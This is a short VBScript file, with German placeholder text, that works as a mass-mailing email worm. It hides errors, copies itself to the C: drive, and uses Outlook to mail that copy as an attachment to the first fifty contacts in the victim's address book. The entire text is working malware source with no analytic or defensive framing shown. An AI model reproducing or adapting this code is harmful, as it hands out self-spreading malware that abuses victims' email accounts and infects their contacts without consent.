On Error Resume Next
Dim x
Set so=CreateObject("Scripting.FileSystemObject")
so.GetFile(WScript.ScriptFullName).Copy("C:\dateiname.vbs")
Set ol=CreateObject("Outlook.Application")
For x=1 To 50
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Betreff der E-Mail"
Mail.Body="Text der E-Mail"
Mail.Attachments.Add("C:\dateiname.vbs")
Mail.Send
Next
ol.Quit